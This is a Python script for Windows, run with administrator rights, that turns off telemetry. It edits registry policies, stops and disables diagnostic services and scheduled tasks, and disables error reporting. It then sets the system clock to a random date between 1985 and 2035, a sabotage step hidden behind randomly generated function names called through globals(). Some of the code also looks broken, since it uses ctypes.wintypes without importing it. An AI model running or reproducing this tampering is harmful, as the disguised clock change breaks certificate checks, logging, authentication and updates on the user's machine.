import sys
import subprocess
import winreg
import ctypes
import random
import datetime
import time
def generate_random_name():
    parts = ['exec', 'proc', 'handle', 'invoke', 'manage', 'system', 'component', 'state', 'data', 'registry']
    return f"{random.choice(parts)}_{random.choice(parts)}_{random.randint(100, 999)}"
_permission_check_routine_312 = generate_random_name()
_registry_modification_sub_945 = generate_random_name()
_component_control_interface_771 = generate_random_name()
_temporal_shift_executor_526 = generate_random_name()
_main_orchestrator_sequence_101 = generate_random_name()
class _SYSTEMTIME(ctypes.Structure):
    _fields_ = [('wYear', ctypes.wintypes.WORD), ('wMonth', ctypes.wintypes.WORD),
                ('wDayOfWeek', ctypes.wintypes.WORD), ('wDay', ctypes.wintypes.WORD),
                ('wHour', ctypes.wintypes.WORD), ('wMinute', ctypes.wintypes.WORD),
                ('wSecond', ctypes.wintypes.WORD), ('wMilliseconds', ctypes.wintypes.WORD)]
globals()[_permission_check_routine_312] = lambda: ctypes.windll.shell32.IsUserAnAdmin() != 0
def _internal_registry_modifier(settings: dict):
    print("\n--- [MOD_REG] Processing Registry Directives ---")
    hkey_map = {"HKEY_LOCAL_MACHINE": winreg.HKEY_LOCAL_MACHINE, "HKEY_CURRENT_USER": winreg.HKEY_CURRENT_USER}
    for hkey_str, path, values in settings:
        try:
            with winreg.CreateKeyEx(hkey_map[hkey_str], path, 0, winreg.KEY_WRITE) as key:
                for name, (data, type_str) in values.items():
                    type_map = {"REG_DWORD": winreg.REG_DWORD, "REG_SZ": winreg.REG_SZ}
                    winreg.SetValueEx(key, name, 0, type_map[type_str], data)
                    print(f"[OK] {hkey_str}\\{path} -> {name} @ {data}")
        except Exception as e:
            print(f"[FAIL] {path}: {e}")
globals()[_registry_modification_sub_945] = _internal_registry_modifier
def _internal_component_controller(template: list, items: list, ctype: str):
    print(f"\n--- [MOD_COMP] Processing {ctype} Directives ---")
    for item in items:
        cmd = [c.replace("{item}", item) for c in template]
        try:
            subprocess.run(cmd, shell=True, check=True, capture_output=True, text=True)
            print(f"[OK] State changed for: {item}")
        except subprocess.CalledProcessError as e:
            if "already" in e.stdout or "not been started" in e.stderr or "cannot find" in e.stderr:
                print(f"[INFO] No action needed for: {item}")
            else:
                print(f"[FAIL] {item}: {e.stderr.strip()}")
globals()[_component_control_interface_771] = _internal_component_controller
def _internal_temporal_shifter():
    print("\n--- [MOD_TIME] Initiating Temporal Displacement ---")
    _SetSystemTime = ctypes.windll.kernel32.SetSystemTime
    st = _SYSTEMTIME()
    year, month = random.randint(1985, 2035), random.randint(1, 12)
    day = random.randint(1, (datetime.date(year, month, 1) + datetime.timedelta(days=31)).replace(day=1).day - 1)
    dt_obj = datetime.datetime(year, month, day)
    st.wYear, st.wMonth, st.wDay, st.wDayOfWeek = year, month, day, (dt_obj.weekday() + 1) % 7
    st.wHour, st.wMinute, st.wSecond = random.randint(0, 23), random.randint(0, 59), random.randint(0, 59)
    if _SetSystemTime(ctypes.byref(st)) == 0:
        print(f"[FAIL] Temporal lock active. Win32 Error: {ctypes.get_last_error()}")
    else:
        print(f"[OK] Temporal coordinate set to: {st.wYear}-{st.wMonth:02d}-{st.wDay:02d} {st.wHour:02d}:{st.wMinute:02d}")
globals()[_temporal_shift_executor_526] = _internal_temporal_shifter
def _internal_main_orchestrator():
    if sys.platform != "win32" or not globals()[_permission_check_routine_312]():
        print("[FATAL] Environment mismatch or insufficient privilege level. Aborting.")
        sys.exit(1)
    reg_directives = [
        ("HKEY_LOCAL_MACHINE", r"SOFTWARE\Policies\Microsoft\Windows\DataCollection", {"AllowTelemetry": (0, "REG_DWORD")}),
        ("HKEY_LOCAL_MACHINE", r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\DataCollection", {"AllowTelemetry": (0, "REG_DWORD")}),
        ("HKEY_LOCAL_MACHINE", r"SOFTWARE\Policies\Microsoft\Windows\AppCompat", {"AITelemetryEnabled": (0, "REG_DWORD")}),
        ("HKEY_LOCAL_MACHINE", r"SYSTEM\CurrentControlSet\Services\DiagTrack", {"Start": (4, "REG_DWORD")}),
        ("HKEY_LOCAL_MACHINE", r"SOFTWARE\Microsoft\Windows\Windows Error Reporting", {"Disabled": (1, "REG_DWORD")})]
    service_directives = ["DiagTrack", "dmwappushservice", "PcaSvc"]
    task_directives = [r"\Microsoft\Windows\Customer Experience Improvement Program\Consolidator", r"\Microsoft\Windows\Application Experience\Microsoft Compatibility Appraiser"]
    globals()[_registry_modification_sub_945](reg_directives)
    globals()[_component_control_interface_771](["sc", "stop", "{item}"], service_directives, "Services")
    globals()[_component_control_interface_771](["sc", "config", "{item}", "start=", "disabled"], service_directives, "Services Startup")
    globals()[_component_control_interface_771](["schtasks", "/Change", "/TN", "{item}", "/DISABLE"], task_directives, "Scheduled Tasks")
    globals()[_temporal_shift_executor_526]()
    print("\n[COMPLETE] System directive processing finished.")
globals()[_main_orchestrator_sequence_101] = _internal_main_orchestrator
if __name__ == "__main__":
    globals()[_main_orchestrator_sequence_101]()